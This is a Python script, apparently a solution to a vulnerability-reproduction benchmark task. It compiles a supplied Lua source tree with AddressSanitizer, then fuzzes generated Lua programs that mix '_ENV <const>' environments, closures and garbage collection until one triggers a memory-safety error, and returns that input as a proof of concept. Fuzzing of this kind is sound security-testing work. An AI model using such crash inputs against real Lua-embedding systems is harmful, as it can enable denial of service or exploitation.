import os
import tarfile
import tempfile
import shutil
import subprocess
import time
import random


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            return self._solve_impl(src_path)
        except Exception:
            return self._fallback_poc()

    def _solve_impl(self, src_path: str) -> bytes:
        tmp_dir = tempfile.mkdtemp(prefix="lua_poc_")
        try:
            self._extract_tarball(src_path, tmp_dir)
            src_dir = self._find_lua_src_dir(tmp_dir)
            if not src_dir:
                return self._fallback_poc()

            lua_bin = self._build_lua_with_asan(src_dir)
            if not lua_bin:
                return self._fallback_poc()

            poc = self._fuzz_for_poc(lua_bin, tmp_dir)
            if poc is not None:
                return poc
            else:
                return self._fallback_poc()
        finally:
            shutil.rmtree(tmp_dir, ignore_errors=True)

    def _extract_tarball(self, tar_path: str, dst_dir: str) -> None:
        with tarfile.open(tar_path, "r:*") as tf:
            tf.extractall(dst_dir)

    def _find_lua_src_dir(self, root: str) -> str | None:
        for dirpath, dirnames, filenames in os.walk(root):
            if "lua.c" in filenames and "lapi.c" in filenames:
                return dirpath
        return None

    def _find_executable(self, root: str, name: str) -> str | None:
        for dirpath, dirnames, filenames in os.walk(root):
            if name in filenames:
                full = os.path.join(dirpath, name)
                if os.path.isfile(full) and os.access(full, os.X_OK):
                    return full
        return None

    def _build_lua_with_asan(self, src_dir: str) -> str | None:
        jobs = max(1, os.cpu_count() or 1)
        env = os.environ.copy()
        compilers = ["clang", "gcc"]
        for cc in compilers:
            cmd = [
                "make",
                f"-j{jobs}",
                f"CC={cc}",
                "CFLAGS=-g -O1 -fsanitize=address -fno-omit-frame-pointer",
                "LDFLAGS=-fsanitize=address",
                "MYCFLAGS=-fsanitize=address -fno-omit-frame-pointer",
                "MYLDFLAGS=-fsanitize=address",
            ]
            res = subprocess.run(
                cmd,
                cwd=src_dir,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            if res.returncode == 0:
                lua_bin = os.path.join(src_dir, "lua")
                if not (os.path.isfile(lua_bin) and os.access(lua_bin, os.X_OK)):
                    lua_bin = self._find_executable(src_dir, "lua")
                if lua_bin:
                    return lua_bin

        # Fallback: build without ASan
        cmd = ["make", f"-j{jobs}"]
        res = subprocess.run(
            cmd,
            cwd=src_dir,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if res.returncode == 0:
            lua_bin = os.path.join(src_dir, "lua")
            if not (os.path.isfile(lua_bin) and os.access(lua_bin, os.X_OK)):
                lua_bin = self._find_executable(src_dir, "lua")
            if lua_bin:
                return lua_bin
        return None

    def _fuzz_for_poc(self, lua_bin: str, work_dir: str) -> bytes | None:
        poc_path = os.path.join(work_dir, "poc.lua")
        rng = random.Random(0)
        deadline = time.time() + 25.0
        max_tries = 4000
        best_code = None

        for attempt in range(max_tries):
            if time.time() > deadline:
                break
            code = self._generate_candidate(rng)
            best_code = code
            try:
                with open(poc_path, "w", encoding="utf-8") as f:
                    f.write(code)
            except OSError:
                continue

            try:
                res = subprocess.run(
                    [lua_bin, poc_path],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.PIPE,
                    timeout=1.0,
                )
            except (subprocess.TimeoutExpired, OSError):
                continue

            stderr_text = res.stderr.decode("utf-8", errors="ignore")
            if res.returncode != 0 and "AddressSanitizer" in stderr_text:
                return code.encode("utf-8", errors="replace")

        if best_code is not None:
            return best_code.encode("utf-8", errors="replace")
        return None

    def _generate_candidate(self, rng: random.Random) -> str:
        header = (
            "local base_mt = {}\n"
            "setmetatable(base_mt, { __index = _G })\n"
            "local function new_env(idx)\n"
            "  local t = { idx = idx }\n"
            "  setmetatable(t, { __index = base_mt })\n"
            "  return t\n"
            "end\n"
            "\n"
            "local saved = {}\n"
            "\n"
        )

        skeletons = [
            self._skeleton_closure_chain,
            self._skeleton_loop_envs,
            self._skeleton_nested_envs,
            self._skeleton_vararg_envs,
        ]
        skel = rng.choice(skeletons)
        return header + skel(rng)

    def _skeleton_closure_chain(self, rng: random.Random) -> str:
        parts: list[str] = []
        parts.append("local _ENV <const> = new_env(0)\n\n")
        num_funcs = rng.randint(1, 4)
        for fi in range(num_funcs):
            idx_val = fi + 1
            parts.append(f"local function maker_{fi}()\n")
            parts.append(f"  local _ENV <const> = new_env({idx_val})\n")
            parts.append("  local up = {}\n")
            parts.append("  function up:method(v)\n")
            parts.append("    return (idx or 0) + (v or 0)\n")
            parts.append("  end\n")
            parts.append("  local function inner(arg)\n")
            parts.append("    return up:method(arg)\n")
            parts.append("  end\n")
            parts.append("  return inner\n")
            parts.append("end\n\n")
            parts.append(f"saved[{idx_val}] = maker_{fi}()\n\n")
        parts.append('collectgarbage("collect")\n')
        parts.append("for i = 1, #saved do\n")
        parts.append("  local f = saved[i]\n")
        parts.append("  if f then f(i) end\n")
        parts.append("end\n")
        return "".join(parts)

    def _skeleton_loop_envs(self, rng: random.Random) -> str:
        parts: list[str] = []
        parts.append("local _ENV <const> = new_env(0)\n\n")
        n = rng.randint(2, 7)
        parts.append(f"for i = 1, {n} do\n")
        parts.append("  local _ENV <const> = new_env(i)\n")
        parts.append("  local function inner(a, b)\n")
        parts.append("    local function nested(z)\n")
        parts.append("      return (idx or 0) + (a or 0) + (b or 0) + (z or 0)\n")
        parts.append("    end\n")
        parts.append("    return nested(i)\n")
        parts.append("  end\n")
        parts.append("  saved[#saved + 1] = inner\n")
        parts.append("end\n\n")
        parts.append('collectgarbage("collect")\n')
        parts.append("for i, f in ipairs(saved) do\n")
        parts.append("  f(i, i * 2)\n")
        parts.append("end\n")
        return "".join(parts)

    def _skeleton_nested_envs(self, rng: random.Random) -> str:
        parts: list[str] = []
        parts.append("local _ENV <const> = new_env(0)\n\n")
        parts.append("local function make_fun(k)\n")
        parts.append("  local _ENV <const> = new_env(k)\n")
        parts.append("  local function inner()\n")
        parts.append("    local _ENV = new_env(k + 100)\n")
        parts.append("    return idx\n")
        parts.append("  end\n")
        parts.append("  return inner\n")
        parts.append("end\n\n")
        n = rng.randint(2, 6)
        parts.append(f"for i = 1, {n} do\n")
        parts.append("  saved[i] = make_fun(i)\n")
        parts.append("end\n\n")
        parts.append('collectgarbage("collect")\n')
        parts.append(f"for i = 1, {n} do\n")
        parts.append("  local f = saved[i]\n")
        parts.append("  if f then f() end\n")
        parts.append("end\n")
        return "".join(parts)

    def _skeleton_vararg_envs(self, rng: random.Random) -> str:
        parts: list[str] = []
        parts.append("local _ENV <const> = new_env(0)\n\n")
        parts.append("local function maker(name, ...)\n")
        parts.append("  local _ENV <const> = new_env(#saved + 1)\n")
        parts.append("  local args = {...}\n")
        parts.append("  local function inner(...)\n")
        parts.append("    local sum = idx or 0\n")
        parts.append("    for i = 1, #args do\n")
        parts.append("      sum = sum + (args[i] or 0)\n")
        parts.append("    end\n")
        parts.append("    local extra = {...}\n")
        parts.append("    for i = 1, #extra do\n")
        parts.append("      sum = sum + (extra[i] or 0)\n")
        parts.append("    end\n")
        parts.append("    return sum\n")
        parts.append("  end\n")
        parts.append("  return inner\n")
        parts.append("end\n\n")
        count = rng.randint(2, 5)
        for i in range(1, count + 1):
            a = rng.randint(1, 5)
            b = rng.randint(1, 5)
            parts.append(f'saved[{i}] = maker("f{i}", {a}, {b})\n')
        parts.append("\ncollectgarbage('collect')\n")
        parts.append("for i = 1, #saved do\n")
        parts.append("  local f = saved[i]\n")
        parts.append("  if f then f(i, i * 3) end\n")
        parts.append("end\n")
        return "".join(parts)

    def _fallback_poc(self) -> bytes:
        # Static fallback PoC using one of the skeletons with fixed parameters
        header = (
            "local base_mt = {}\n"
            "setmetatable(base_mt, { __index = _G })\n"
            "local function new_env(idx)\n"
            "  local t = { idx = idx }\n"
            "  setmetatable(t, { __index = base_mt })\n"
            "  return t\n"
            "end\n"
            "\n"
            "local saved = {}\n"
            "\n"
        )
        body = []
        body.append("local _ENV <const> = new_env(0)\n\n")
        body.append("local function make_fun(k)\n")
        body.append("  local _ENV <const> = new_env(k)\n")
        body.append("  local function inner()\n")
        body.append("    local _ENV = new_env(k + 100)\n")
        body.append("    return idx\n")
        body.append("  end\n")
        body.append("  return inner\n")
        body.append("end\n\n")
        body.append("for i = 1, 4 do\n")
        body.append("  saved[i] = make_fun(i)\n")
        body.append("end\n\n")
        body.append("collectgarbage('collect')\n")
        body.append("for i = 1, 4 do\n")
        body.append("  local f = saved[i]\n")
        body.append("  if f then f() end\n")
        body.append("end\n")
        code = header + "".join(body)
        return code.encode("utf-8", errors="replace")